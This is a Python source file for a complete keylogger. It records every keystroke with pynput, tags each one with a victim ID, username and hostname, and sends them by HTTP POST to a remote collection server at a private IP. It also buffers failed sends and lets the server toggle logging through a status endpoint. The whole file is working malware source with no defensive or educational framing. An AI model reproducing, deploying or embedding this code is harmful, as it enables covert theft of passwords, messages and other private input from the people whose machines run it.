import json
import uuid
import time
import socket
import os
import requests
from pynput.keyboard import Listener, Key

SERVER_URL = "http://192.168.50.10:5000"

victim_id = str(uuid.uuid4())
victim_username = os.getlogin()
victim_hostname = socket.gethostname()

BUFFER = []


def send_payload(payload):
    try:
        requests.post(f"{SERVER_URL}/receive", json=payload, timeout=1)
        return True
    except:
        return False


def flush_buffer():
    global BUFFER
    for payload in list(BUFFER):
        if send_payload(payload):
            BUFFER.remove(payload)


def is_logger_active():
    try:
        data = requests.get(f"{SERVER_URL}/status", timeout=1).json()
        return data.get("active", True)
    except:
        return True


def on_press(key):
    if not is_logger_active():
        return

    timestamp = time.time()

    try:
        char = key.char
    except:
        if key == Key.space:
            char = " "
        elif key == Key.backspace:
            char = "<BACKSPACE>"
        elif key == Key.enter:
            char = "<ENTER>"
        else:
            char = f"<{key}>"

    payload = {
        "victim": victim_id,
        "username": victim_username,
        "hostname": victim_hostname,
        "timestamp": timestamp,
        "key": char
    }

    if not send_payload(payload):
        BUFFER.append(payload)

    flush_buffer()


listener = Listener(on_press=on_press)
listener.start()

print("[KEYLOGGER STARTED]")
print(f"Victim ID: {victim_id}")
print(f"Username : {victim_username}")
print(f"Hostname : {victim_hostname}")

listener.join()
